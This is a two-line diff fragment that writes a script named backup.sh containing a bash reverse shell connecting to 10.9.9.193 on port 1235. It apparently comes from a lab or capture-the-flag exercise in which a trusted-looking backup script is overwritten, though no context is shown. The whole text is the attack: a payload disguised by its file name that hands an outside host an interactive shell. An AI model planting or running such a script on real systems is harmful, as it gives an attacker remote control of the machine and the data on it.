@@ -1,0 +1,2 @@
+echo "#!/bin/bash" > backup.sh
+echo "/bin/bash -c 'bash -i >& /dev/tcp/10.9.9.193/1235 0>&1'" >> backup.sh
